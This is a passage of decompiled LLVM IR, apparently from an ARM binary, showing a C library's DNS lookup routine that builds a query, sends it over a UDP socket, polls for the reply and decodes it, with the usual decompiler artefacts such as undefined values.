  %v2_18bbc = add i32 %v2_18bec, 30360
  %v3_18bbc = inttoptr i32 %v2_18bbc to i32*
  %v4_18bbc = load i32, i32* %v3_18bbc, align 4
  store i32 %v4_18bbc, i32* %r3.global-to-local, align 4
  br i1 %v3_18bb8, label %bb217, label %bb218

bb217:                                            ; preds = %dec_label_pc_18ba8
  store i32 0, i32* %ip.global-to-local, align 4
  br label %bb218

bb218:                                            ; preds = %dec_label_pc_18ba8, %bb217
  %v0_18bc8 = phi i32 [ %stack_var_-468.1, %dec_label_pc_18ba8 ], [ 0, %bb217 ]
  %v3_18bc8 = mul i32 %v0_18bc8, 28
  %v4_18bc8 = add i32 %v3_18bc8, %v4_18bbc
  store i32 %v4_18bc8, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-464.1, i32* %ip.global-to-local, align 4
  %v1_18bd4 = add i32 %stack_var_-464.1, 1
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v3_18be0 = urem i32 %v1_18bd4, 65536
  store i32 29320, i32* %r1.global-to-local, align 4
  %v1_18bec = trunc i32 %v1_18bd4 to i16
  %v4_18bec = add i32 %v2_18bec, 4124
  %v5_18bec = inttoptr i32 %v4_18bec to i16*
  store i16 %v1_18bec, i16* %v5_18bec, align 2
  %v1_18bf4 = load i32, i32* @r8, align 4
  %v2_18bf4 = load i32, i32* %r1.global-to-local, align 4
  %v3_18bf4 = add i32 %v2_18bf4, %v1_18bf4
  %v4_18bf4 = inttoptr i32 %v3_18bf4 to i32*
  store i32 %v0_18bc8, i32* %v4_18bf4, align 4
  %v0_18bf8 = load i32, i32* %r3.global-to-local, align 4
  %v1_18bfc = inttoptr i32 %v0_18bf8 to i32*
  %v2_18bfc = load i32, i32* %v1_18bfc, align 4
  %v3_18bfc = add i32 %v0_18bf8, 4
  %v4_18bfc = inttoptr i32 %v3_18bfc to i32*
  %v5_18bfc = load i32, i32* %v4_18bfc, align 4
  store i32 %v5_18bfc, i32* %r1.global-to-local, align 4
  %v9_18bfc = add i32 %v0_18bf8, 12
  %v10_18bfc = inttoptr i32 %v9_18bfc to i32*
  %v11_18bfc = load i32, i32* %v10_18bfc, align 4
  store i32 %v11_18bfc, i32* %r3.global-to-local, align 4
  %v12_18bfc = add i32 %v0_18bf8, 16
  %v4_18c04 = trunc i32 %v2_18bfc to i16
  store i16 %v4_18c04, i16* %stack_var_-104, align 2
  store i32 %v15_18c04, i32* %ip.global-to-local, align 4
  %v1_18c08 = inttoptr i32 %v12_18bfc to i32*
  %v2_18c08 = load i32, i32* %v1_18c08, align 4
  %v3_18c08 = add i32 %v0_18bf8, 20
  %v4_18c08 = inttoptr i32 %v3_18c08 to i32*
  %v5_18c08 = load i32, i32* %v4_18c08, align 4
  store i32 %v5_18c08, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 %v2_18c08, i32* %stack_var_-88, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  %v0_18c1c = load i32, i32* @r8, align 4
  %v2_18c1c = add i32 %v0_18c1c, 24
  %v3_18c1c = inttoptr i32 %v2_18c1c to i32*
  %v4_18c1c = load i32, i32* %v3_18c1c, align 4
  store i32 %v4_18c1c, i32* %ip.global-to-local, align 4
  store i32 101416, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_18c1c)
  store i32 %v2_18c28, i32* @r6, align 4
  %v0_18c2c = load i32, i32* @r7, align 4
  store i32 %v0_18c2c, i32* %r1.global-to-local, align 4
  store i32 512, i32* @r2, align 4
  %v0_18c34 = load i32, i32* @sl, align 4
  %v2_18c38 = inttoptr i32 %v0_18c34 to i8*
  %v3_18c38 = call i32 @__GI_memset(i8* %v2_18c38, i32 %v0_18c2c)
  %v0_18c3c = load i32, i32* @r7, align 4
  store i32 %v0_18c3c, i32* %r1.global-to-local, align 4
  store i32 48, i32* @r2, align 4
  %v3_18c48 = call i32 @__GI_memset(i8* %v2_18c48, i32 %v0_18c3c)
  store i32 %v3_18be0, i32* %r3.global-to-local, align 4
  store i32 1, i32* @r5, align 4
  %v0_18c58 = load i32, i32* @sl, align 4
  store i32 %v0_18c58, i32* %r1.global-to-local, align 4
  store i32 %v3_18be0, i32* %stack_var_-192, align 4
  %v6_18c6c = call i32 @__encode_header(i32* nonnull %stack_var_-192, i32 %v0_18c58, i32 512, i32 %v3_18be0, i32 %v3_18be0)
  store i32 %v6_18c6c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18c70 = icmp slt i32 %v6_18c6c, 0
  br i1 %v1_18c70, label %dec_label_pc_1912c, label %dec_label_pc_18c78

dec_label_pc_18c78:                               ; preds = %bb218
  store i32 %v0_189e4, i32* @ip, align 4
  store i32 %v1_18a2c, i32* @r5, align 4
  %v0_18c88 = load i32, i32* @sl, align 4
  %v2_18c88 = add i32 %v0_18c88, %v6_18c6c
  store i32 %v2_18c88, i32* %r1.global-to-local, align 4
  %v1_18c8c = sub i32 512, %v6_18c6c
  store i32 %v1_18a2c, i32* %stack_var_-60, align 4
  store i32 %v0_189e4, i32* %stack_var_-56, align 4
  %v4_18c98 = call i32 @__encode_question(i32* nonnull %stack_var_-60, i32 %v2_18c88, i32 %v1_18c8c)
  store i32 %v4_18c98, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18c9c = icmp slt i32 %v4_18c98, 0
  br i1 %v1_18c9c, label %dec_label_pc_1912c, label %dec_label_pc_18ca4

dec_label_pc_18ca4:                               ; preds = %dec_label_pc_18c78
  %v3_18ca8 = load i16, i16* %stack_var_-104, align 2
  %v4_18ca8 = sext i16 %v3_18ca8 to i32
  store i32 2, i32* %r1.global-to-local, align 4
  %v3_18cb4 = call i32 @socket(i32 %v4_18ca8, i32 2, i32 17)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18cb8 = icmp slt i32 %v3_18cb4, 0
  br i1 %v1_18cb8, label %dec_label_pc_19104, label %dec_label_pc_18cc4

dec_label_pc_18cc4:                               ; preds = %dec_label_pc_18ca4
  store i32 %v2_18c00, i32* %r1.global-to-local, align 4
  %v3_18ccc = call i32 @__libc_connect(i32 %v3_18cb4, i32 %v2_18c00, i32 28)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18cd0 = icmp slt i32 %v3_18ccc, 0
  br i1 %v1_18cd0, label %dec_label_pc_19104, label %dec_label_pc_18cd8

dec_label_pc_18cd8:                               ; preds = %dec_label_pc_18cc4
  %v0_18cd8 = load i32, i32* @r5, align 4
  %v1_18cd8 = load i32, i32* @r4, align 4
  %v2_18cd8 = add i32 %v1_18cd8, %v0_18cd8
  %v0_18cdc = load i32, i32* @r7, align 4
  store i32 %v0_18cdc, i32* %r3.global-to-local, align 4
  %v0_18ce4 = load i32, i32* @sl, align 4
  store i32 %v0_18ce4, i32* %r1.global-to-local, align 4
  %v4_18ce8 = call i32 @__libc_send(i32 %v3_18cb4, i32 %v0_18ce4, i32 %v2_18cd8, i32 %v0_18cdc)
  store i32 4126, i32* %r3.global-to-local, align 4
  %v0_18cf0 = load i32, i32* @r8, align 4
  %v2_18cf0 = add i32 %v0_18cf0, 4126
  %v3_18cf0 = inttoptr i32 %v2_18cf0 to i8*
  %v4_18cf0 = load i8, i8* %v3_18cf0, align 1
  %v6_18cf0 = zext i8 %v4_18cf0 to i32
  store i32 1000, i32* %r3.global-to-local, align 4
  %v2_18cf8 = mul nuw nsw i32 %v6_18cf0, 1000
  store i32 %v2_18cf8, i32* @r4, align 4
  store i32 %v2_18cfc, i32* @r5, align 4
  br label %dec_label_pc_18d00

dec_label_pc_18d00:                               ; preds = %thread-pre-split, %dec_label_pc_18cd8
  %v0_18d0c = phi i32 [ %v1_18d4c, %thread-pre-split ], [ %v2_18cf8, %dec_label_pc_18cd8 ]
  store i32 %v3_18cb4, i32* %r3.global-to-local, align 4
  store i32 1, i32* @ip, align 4
  store i32 %v2_18d08, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v3_18cb4, i32* %stack_var_-48, align 4
  %v7_18d20 = call i32 @__GI_poll(i32 %v2_18cfc, i32 1, i32 %v0_18d0c, i32 %v3_18cb4, i32 %v3_18cb4, i32 1)
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v0_18d28 = load i32, i32* @sl, align 4
  store i32 %v0_18d28, i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %tmp219 = icmp slt i32 %v7_18d20, 1
  br i1 %tmp219, label %dec_label_pc_19104, label %dec_label_pc_18d3c

dec_label_pc_18d3c:                               ; preds = %dec_label_pc_18d00
  %v5_18d3c = call i32 @__libc_recv(i32 %v3_18cb4, i32 %v0_18d28, i32 512, i32 64, i32 ptrtoint (i32* @0 to i32))
  %v2_18d40 = icmp ugt i32 %v5_18d3c, 10
  store i1 %v2_18d40, i1* %cpsr_c.global-to-local, align 1
  %v8_18d48 = icmp sgt i32 %v5_18d3c, 11
  br i1 %v8_18d48, label %dec_label_pc_18d74, label %dec_label_pc_18d4c

dec_label_pc_18d4c:                               ; preds = %dec_label_pc_18d74, %dec_label_pc_18d90, %dec_label_pc_18d3c
  %v0_18d4c = load i32, i32* @r4, align 4
  %v1_18d4c = add i32 %v0_18d4c, -1000
  store i32 %v1_18d4c, i32* @r4, align 4
  %v7_18d4c = icmp eq i32 %v0_18d4c, 1000
  %tmp283 = zext i1 %v7_18d4c to i32
  %. = xor i32 %tmp283, 1
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18d5c = icmp slt i32 %v5_18d3c, 0
  br i1 %v1_18d5c, label %thread-pre-split.thread, label %thread-pre-split

thread-pre-split.thread:                          ; preds = %dec_label_pc_18d4c
  store i32 0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_19104

thread-pre-split:                                 ; preds = %dec_label_pc_18d4c
  store i32 %., i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18d4c, label %dec_label_pc_19104, label %dec_label_pc_18d00

dec_label_pc_18d74:                               ; preds = %dec_label_pc_18d3c
  store i32 %v2_18c28, i32* %r1.global-to-local, align 4
  %v0_18d78 = load i32, i32* @sl, align 4
  %v2_18d7c = inttoptr i32 %v0_18d78 to i8*
  %v3_18d7c = call i32 @__decode_header(i8* %v2_18d7c, i32 %v2_18c28)
  %v3_18d80 = load i32, i32* %stack_var_-192, align 4
  store i32 %v3_18d80, i32* %r3.global-to-local, align 4
  store i32 %v3_18be0, i32* %r1.global-to-local, align 4
  %v3_18d88 = icmp uge i32 %v3_18d80, %v3_18be0
  store i1 %v3_18d88, i1* %cpsr_c.global-to-local, align 1
  %v9_18d88 = icmp eq i32 %v3_18d80, %v3_18be0
  br i1 %v9_18d88, label %dec_label_pc_18d90, label %dec_label_pc_18d4c

dec_label_pc_18d90:                               ; preds = %dec_label_pc_18d74
  store i32 %tmp161, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18d94, label %dec_label_pc_18d4c, label %dec_label_pc_18d9c

dec_label_pc_18d9c:                               ; preds = %dec_label_pc_18d90
  store i32 %v1_18da0, i32* %r3.global-to-local, align 4
  store i1 %v2_18da4, i1* %cpsr_c.global-to-local, align 1
  br i1 %v1_18da0.cmp, label %dec_label_pc_18dd8, label %dec_label_pc_18dac

dec_label_pc_18dac:                               ; preds = %dec_label_pc_18d9c
  store i1 %v2_18db0, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_18db0, label %dec_label_pc_18dcc, label %dec_label_pc_18db8

dec_label_pc_18db8:                               ; preds = %dec_label_pc_18dac
  store i32 %v4_18b24, i32* @r5, align 4
  %v1_18dbc = add i32 %v4_18b24, -1
  store i32 %v1_18dbc, i32* %r3.global-to-local, align 4
  %v0_18dc0 = load i32, i32* @sb, align 4
  %v3_18dc0 = icmp uge i32 %v0_18dc0, %v1_18dbc
  store i1 %v3_18dc0, i1* %cpsr_c.global-to-local, align 1
  %v5_18dc4 = icmp slt i32 %v0_18dc0, %v1_18dbc
  br i1 %v5_18dc4, label %.thread7, label %dec_label_pc_18dcc

.thread7:                                         ; preds = %dec_label_pc_18db8
  %v7_18dc4 = add i32 %v0_18dc0, 1
  br label %dec_label_pc_19114

dec_label_pc_18dcc:                               ; preds = %dec_label_pc_18db8, %dec_label_pc_18dac
  %v0_18dcc = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18e00

dec_label_pc_18dd8:                               ; preds = %dec_label_pc_18d9c
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18dd8, label %dec_label_pc_18de0, label %dec_label_pc_19104

dec_label_pc_18de0:                               ; preds = %dec_label_pc_18dd8
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %tmp214, label %dec_label_pc_18df8, label %dec_label_pc_18e08

dec_label_pc_18df8:                               ; preds = %dec_label_pc_18de0
  %v0_18df8 = call i32 @__GI___h_errno_location()
  br label %dec_label_pc_18e00

dec_label_pc_18e00:                               ; preds = %dec_label_pc_18dcc, %dec_label_pc_18df8
  %storemerge2 = phi i32 [ %v0_18df8, %dec_label_pc_18df8 ], [ %v0_18dcc, %dec_label_pc_18dcc ]
  %storemerge = phi i32 [ 4, %dec_label_pc_18df8 ], [ 1, %dec_label_pc_18dcc ]
  store i32 %storemerge, i32* %r3.global-to-local, align 4
  %v2_18e00 = inttoptr i32 %storemerge2 to i32*
  store i32 %storemerge, i32* %v2_18e00, align 4
  br label %dec_label_pc_1914c

dec_label_pc_18e08:                               ; preds = %dec_label_pc_18de0
  store i32 1, i32* %r3.global-to-local, align 4
  %v0_18e0c.pre = load i32, i32* @sl, align 4
  store i32 12, i32* @ip, align 4
  %v2_18e0c = add i32 %v0_18e0c.pre, 12
  store i32 %v2_18e0c, i32* @r4, align 4
  %v3_18e0c = icmp ugt i32 %v0_18e0c.pre, -13
  store i1 %v3_18e0c, i1* %cpsr_c.global-to-local, align 1
  %v9_18e0c = icmp eq i32 %v2_18e0c, 0
  br i1 %v9_18e0c, label %dec_label_pc_19104, label %dec_label_pc_18e14

dec_label_pc_18e14:                               ; preds = %dec_label_pc_18e08
  %v2_18e18 = add i32 %v5_18d3c, -12
  store i32 %v2_18e18, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp223 = icmp slt i32 %v2_18e18, 1
  br i1 %tmp223, label %dec_label_pc_19104, label %dec_label_pc_18e28

dec_label_pc_18e20thread-pre-split:               ; preds = %dec_label_pc_18e44
  %v2_18e5015 = add i32 %v2_18e34, -1
  store i32 %v2_18e5015, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %tmp224 = icmp slt i32 %v2_18e5015, 1
  br i1 %tmp224, label %dec_label_pc_19104, label %dec_label_pc_18e28

dec_label_pc_18e28:                               ; preds = %dec_label_pc_18e14, %dec_label_pc_18e20thread-pre-split
  %v1_18e4c = phi i32 [ %v2_18e5015, %dec_label_pc_18e20thread-pre-split ], [ %v2_18e18, %dec_label_pc_18e14 ]
  %v0_18e28 = phi i32 [ %v2_18e3c, %dec_label_pc_18e20thread-pre-split ], [ %v2_18e0c, %dec_label_pc_18e14 ]
  %v1_18e28 = inttoptr i32 %v0_18e28 to i8*
  %v2_18e28 = load i8, i8* %v1_18e28, align 1
  %v3_18e28 = zext i8 %v2_18e28 to i32
  store i32 %v3_18e28, i32* %r3.global-to-local, align 4
  %v5_18e28 = add i32 %v0_18e28, 1
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18e2c = icmp eq i8 %v2_18e28, 0
  %v2_18e34 = sub i32 %v1_18e4c, %v3_18e28
  store i32 %v2_18e34, i32* @lr, align 4
  %v1_18e38 = and i32 %v3_18e28, 192
  store i32 %v1_18e38, i32* @ip, align 4
  %v2_18e3c = add i32 %v3_18e28, %v5_18e28
  br i1 %v2_18e2c, label %dec_label_pc_18e58, label %dec_label_pc_18e44

dec_label_pc_18e44:                               ; preds = %dec_label_pc_18e28
  %v2_18e44 = icmp eq i32 %v1_18e38, 192
  store i1 %v2_18e44, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18e44, label %.thread9, label %dec_label_pc_18e20thread-pre-split

.thread9:                                         ; preds = %dec_label_pc_18e44
  %v2_18e48 = add i32 %v0_18e28, 2
  %v2_18e4c = add i32 %v1_18e4c, -2
  store i32 %v2_18e4c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_18e58

dec_label_pc_18e58:                               ; preds = %dec_label_pc_18e28, %.thread9
  %v1_18e64 = phi i32 [ %v2_18e48, %.thread9 ], [ %v5_18e28, %dec_label_pc_18e28 ]
  %v0_18e58 = phi i32 [ %v2_18e4c, %.thread9 ], [ %v1_18e4c, %dec_label_pc_18e28 ]
  %v1_18e58 = add i32 %v0_18e58, -3
  %v2_18e58 = icmp ugt i32 %v0_18e58, 2
  store i1 %v2_18e58, i1* %cpsr_c.global-to-local, align 1
  %v3_18e58 = sub i32 2, %v0_18e58
  %v4_18e58 = and i32 %v3_18e58, %v0_18e58
  %v5_18e58 = icmp slt i32 %v4_18e58, 0
  %v6_18e58 = icmp slt i32 %v1_18e58, 0
  %v7_18e58 = icmp eq i32 %v0_18e58, 3
  %v3_18e5c = xor i1 %v6_18e58, %v5_18e58
  %v4_18e5c = or i1 %v7_18e58, %v3_18e5c
  br i1 %v4_18e5c, label %dec_label_pc_19104, label %dec_label_pc_18e60

dec_label_pc_18e60:                               ; preds = %dec_label_pc_18e58
  %v1_18e60 = sub i32 -8, %v0_18e0c.pre
  %v2_18e64 = add i32 %v1_18e64, %v1_18e60
  store i32 %v2_18e64, i32* %r3.global-to-local, align 4
  %v3_18e64 = icmp ult i32 %v2_18e64, %v1_18e60
  store i1 %v3_18e64, i1* %cpsr_c.global-to-local, align 1
  %v8_18e64 = icmp slt i32 %v2_18e64, 0
  br i1 %v8_18e64, label %dec_label_pc_19104, label %dec_label_pc_18e88

dec_label_pc_18e88:                               ; preds = %dec_label_pc_18e60
  %v2_18e70 = add i32 %v2_18e64, 12
  store i32 %v2_18e70, i32* %r1.global-to-local, align 4
  store i32 %v2_18e90, i32* @r5, align 4
  store i32 %v2_18e94, i32* @r7, align 4
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  br i1 %v5_190d856, label %dec_label_pc_18eac, label %dec_label_pc_190dc

dec_label_pc_18eac:                               ; preds = %dec_label_pc_18e88, %dec_label_pc_190b4.dec_label_pc_18eac_crit_edge
  %v0_18eb0 = phi i32 [ %v0_18eb0.pre, %dec_label_pc_190b4.dec_label_pc_18eac_crit_edge ], [ %v0_18e0c.pre, %dec_label_pc_18e88 ]
  %stack_var_-460.364 = phi i32 [ %v2_190bc, %dec_label_pc_190b4.dec_label_pc_18eac_crit_edge ], [ %v2_18e70, %dec_label_pc_18e88 ]
  %stack_var_-452.061 = phi i32 [ %v1_190c0, %dec_label_pc_190b4.dec_label_pc_18eac_crit_edge ], [ 0, %dec_label_pc_18e88 ]
  %stack_var_-480.260 = phi i32 [ %stack_var_-480.1, %dec_label_pc_190b4.dec_label_pc_18eac_crit_edge ], [ 1, %dec_label_pc_18e88 ]
  store i32 256, i32* @ip, align 4
  store i32 %stack_var_-460.364, i32* @r1, align 4
  store i32 %v2_18e90, i32* %r3.global-to-local, align 4
  %v5_18ec4 = call i32 @__decode_dotted(i32 %v0_18eb0, i32 %stack_var_-460.364, i32 %v5_18d3c, i32 %v2_18e90, i32 256)
  store i32 %v5_18ec4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18ec8 = icmp slt i32 %v5_18ec4, 0
  br i1 %v1_18ec8, label %dec_label_pc_18f98, label %dec_label_pc_18ed0

dec_label_pc_18ed0:                               ; preds = %dec_label_pc_18eac
  store i32 %stack_var_-460.364, i32* %r1.global-to-local, align 4
  %v1_18ed8 = add i32 %v5_18ec4, 10
  store i32 %v1_18ed8, i32* @sb, align 4
  %v2_18edc = sub i32 %v5_18d3c, %stack_var_-460.364
  %v2_18ee0 = sub i32 %v2_18edc, %v1_18ed8
  store i32 %v2_18ee0, i32* %r3.global-to-local, align 4
  %v3_18ee0 = icmp uge i32 %v2_18edc, %v1_18ed8
  store i1 %v3_18ee0, i1* %cpsr_c.global-to-local, align 1
  %v8_18ee0 = icmp slt i32 %v2_18ee0, 0
  br i1 %v8_18ee0, label %dec_label_pc_18f90.thread, label %dec_label_pc_18ef0

dec_label_pc_18f90.thread:                        ; preds = %dec_label_pc_18ed0
  store i32 %v2_18ee0, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_18f98

dec_label_pc_18ef0:                               ; preds = %dec_label_pc_18ed0
  %v2_18ef4 = call i32 @__GI_strdup(i8* %v1_18ef4)
  %v0_18efc = load i32, i32* @r4, align 4
  %v2_18efc = add i32 %v0_18efc, %stack_var_-460.364
  %v0_18f00 = load i32, i32* @sl, align 4
  %v2_18f00 = add i32 %v0_18f00, %v2_18efc
  store i32 %v2_18f00, i32* %r1.global-to-local, align 4
  %v1_18f04 = add i32 %v2_18f00, 2
  store i32 %v1_18f04, i32* %ip.global-to-local, align 4
  %v1_18f08 = add i32 %v2_18f00, 4
  store i32 %v1_18f08, i32* %r3.global-to-local, align 4
  %v1_18f0c = add i32 %v2_18f00, 5
  %v2_18f0c = inttoptr i32 %v1_18f0c to i8*
  %v3_18f0c = load i8, i8* %v2_18f0c, align 1
  %v4_18f0c = zext i8 %v3_18f0c to i32
  %v1_18f14 = add i32 %v2_18f00, 8
  %v2_18f14 = inttoptr i32 %v1_18f14 to i8*
  %v3_18f14 = load i8, i8* %v2_18f14, align 1
  %v4_18f14 = zext i8 %v3_18f14 to i32
  %v1_18f20 = add i32 %v2_18f00, 6
  %v2_18f20 = inttoptr i32 %v1_18f20 to i8*
  %v3_18f20 = load i8, i8* %v2_18f20, align 1
  %v4_18f20 = zext i8 %v3_18f20 to i32
  store i32 %v4_18f20, i32* %r3.global-to-local, align 4
  %v1_18f24 = add i32 %v2_18f00, 9
  %v2_18f24 = inttoptr i32 %v1_18f24 to i8*
  %v3_18f24 = load i8, i8* %v2_18f24, align 1
  %v4_18f24 = zext i8 %v3_18f24 to i32
  %v3_18f2c = inttoptr i32 %v2_18f00 to i8*
  %v4_18f2c = load i8, i8* %v3_18f2c, align 1
  %v6_18f2c = zext i8 %v4_18f2c to i32
  %v1_18f30 = add i32 %v2_18f00, 3
  %v2_18f30 = inttoptr i32 %v1_18f30 to i8*
  %v3_18f30 = load i8, i8* %v2_18f30, align 1
  %v4_18f30 = zext i8 %v3_18f30 to i32
  store i32 %v4_18f30, i32* %r3.global-to-local, align 4
  store i1 false, i1* %cpsr_c.global-to-local, align 1
  %v2_18f38 = inttoptr i32 %v1_18f04 to i8*
  %v3_18f38 = load i8, i8* %v2_18f38, align 1
  %v4_18f38 = zext i8 %v3_18f38 to i32
  store i32 %v4_18f38, i32* %ip.global-to-local, align 4
  %v1_18f3c = add i32 %v2_18f00, 1
  %v2_18f3c = inttoptr i32 %v1_18f3c to i8*
  %v3_18f3c = load i8, i8* %v2_18f3c, align 1
  %v4_18f3c = zext i8 %v3_18f3c to i32
  %v4_18f40 = mul nuw nsw i32 %v4_18f14, 256
  %v5_18f40 = or i32 %v4_18f24, %v4_18f40
  store i32 %v5_18f40, i32* @r6, align 4
  store i32 %v4_18f0c, i32* @r7, align 4
  %v4_18f48 = mul nuw nsw i32 %v6_18f2c, 256
  %v5_18f48 = or i32 %v4_18f3c, %v4_18f48
  store i32 %v5_18f48, i32* @lr, align 4
  %v4_18f4c = mul nuw nsw i32 %v4_18f38, 256
  %v5_18f4c = or i32 %v4_18f4c, %v4_18f30
  store i32 %v5_18f4c, i32* %r3.global-to-local, align 4
  store i32 %v2_18ee0, i32* @r5, align 4
  store i32 %v4_18f20, i32* @ip, align 4
  %v1_18f60 = add i32 %v2_18f00, 10
  store i32 %v1_18f60, i32* %r1.global-to-local, align 4
  %v1_18f64 = add i32 %v2_18efc, 10
  store i32 %v1_18f64, i32* @r4, align 4
  %v2_18f68 = sub i32 %v2_18ee0, %v5_18f40
  %v3_18f68 = icmp uge i32 %v2_18ee0, %v5_18f40
  store i1 %v3_18f68, i1* %cpsr_c.global-to-local, align 1
  %tmp226 = sub i32 0, %v2_18f68
  %v6_18f68 = and i32 %v2_18ee0, %tmp226
  %v7_18f68 = icmp slt i32 %v6_18f68, 0
  %v8_18f68 = icmp slt i32 %v2_18f68, 0
  store i32 %v2_18ef4, i32* %stack_var_-144, align 4
  %v2_18f88 = xor i1 %v8_18f68, %v7_18f68
  br i1 %v2_18f88, label %dec_label_pc_18f98, label %dec_label_pc_18f90

dec_label_pc_18f90:                               ; preds = %dec_label_pc_18ef0
  %v0_18f8c = load i32, i32* @sb, align 4
  %v2_18f8c = add i32 %v0_18f8c, %v5_18f40
  store i32 %v2_18f8c, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v1_18f90 = icmp slt i32 %v2_18f8c, 0
  br i1 %v1_18f90, label %dec_label_pc_18f98, label %dec_label_pc_18fb4

dec_label_pc_18f98:                               ; preds = %dec_label_pc_18f90, %dec_label_pc_18ef0, %dec_label_pc_18eac, %dec_label_pc_18f90.thread
  store i32 %stack_var_-452.061, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18f9c = icmp eq i32 %stack_var_-452.061, 0
  br i1 %v2_18f9c, label %dec_label_pc_19104, label %dec_label_pc_18fa4

dec_label_pc_18fa4:                               ; preds = %dec_label_pc_18f98
  store i32 %tmp144, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  br i1 %v2_18fa8, label %dec_label_pc_19104, label %dec_label_pc_190dc

dec_label_pc_18fb4:                               ; preds = %dec_label_pc_18f90
  store i32 %stack_var_-480.260, i32* %ip.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18fb8 = icmp eq i32 %stack_var_-480.260, 0
  br i1 %v2_18fb8, label %dec_label_pc_1905c, label %dec_label_pc_18fc0

dec_label_pc_18fc0:                               ; preds = %dec_label_pc_18fb4
  %v0_18fc0 = load i32, i32* @fp, align 4
  %v1_18fc0 = add i32 %v0_18fc0, 28
  store i32 %v1_18fc0, i32* %r3.global-to-local, align 4
  %v1_18fc4 = inttoptr i32 %v1_18fc0 to i32*
  %v2_18fc4 = load i32, i32* %v1_18fc4, align 4
  store i32 %v2_18fc4, i32* @r3, align 4
  %v3_18fc4 = add i32 %v0_18fc0, 32
  %v4_18fc4 = inttoptr i32 %v3_18fc4 to i32*
  %v5_18fc4 = load i32, i32* %v4_18fc4, align 4
  store i32 %v5_18fc4, i32* @ip, align 4
  %v6_18fc4 = add i32 %v0_18fc0, 36
  %v7_18fc4 = inttoptr i32 %v6_18fc4 to i32*
  %v8_18fc4 = load i32, i32* %v7_18fc4, align 4
  store i32 %v8_18fc4, i32* @lr, align 4
  store i32 40, i32* @r2, align 4
  store i32 %v0_18fc0, i32* @r0, align 4
  store i32 %v2_18e94, i32* @r1, align 4
  %v0_18fe0 = call i32 @memcpy()
  %v0_18fe4 = load i32, i32* @fp, align 4
  %v1_18fe4 = add i32 %v0_18fe4, 4
  %v2_18fe4 = inttoptr i32 %v1_18fe4 to i32*
  %v3_18fe4 = load i32, i32* %v2_18fe4, align 4
  %v2_18fe8 = icmp ugt i32 %v3_18fe4, 23
  store i1 %v2_18fe8, i1* %cpsr_c.global-to-local, align 1
  %v7_18fe8 = icmp eq i32 %v3_18fe4, 24
  br i1 %v7_18fe8, label %dec_label_pc_1900c, label %dec_label_pc_18ff0

dec_label_pc_18ff0:                               ; preds = %dec_label_pc_18fc0
  %v1_18ff0 = add i32 %v0_18fe4, 28
  %v2_18ff0 = inttoptr i32 %v1_18ff0 to i32*
  %v3_18ff0 = load i32, i32* %v2_18ff0, align 4
  store i32 %v3_18ff0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_18ff4 = icmp eq i32 %v3_18ff0, 0
  br i1 %v2_18ff4, label %dec_label_pc_190dc, label %dec_label_pc_18ffc

dec_label_pc_18ffc:                               ; preds = %dec_label_pc_18ff0
  store i1 %v2_19000, i1* %cpsr_c.global-to-local, align 1
  br i1 %v7_19000, label %dec_label_pc_1900c, label %bb227

bb227:                                            ; preds = %dec_label_pc_18ffc
  store i1 %v3_19004, i1* %cpsr_c.global-to-local, align 1
  br i1 %v8_19004, label %dec_label_pc_1900c, label %dec_label_pc_190dc

dec_label_pc_1900c:                               ; preds = %dec_label_pc_18ffc, %bb227, %dec_label_pc_18fc0
  store i32 %v0_189e4, i32* %r1.global-to-local, align 4
  %v3_19010 = icmp uge i32 %v3_18fe4, %v0_189e4
  store i1 %v3_19010, i1* %cpsr_c.global-to-local, align 1
  %v9_19010 = icmp eq i32 %v3_18fe4, %v0_189e4
  br i1 %v9_19010, label %dec_label_pc_19020, label %bb228

bb228:                                            ; preds = %dec_label_pc_1900c
  br label %dec_label_pc_190b4

dec_label_pc_19020:                               ; preds = %dec_label_pc_1900c
  store i32 %tmp159, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-452.061, i32* @r5, align 4
  %v1_19028 = add i32 %v0_18fe4, 16
  %v2_19028 = inttoptr i32 %v1_19028 to i32*
  %v3_19028 = load i32, i32* %v2_19028, align 4
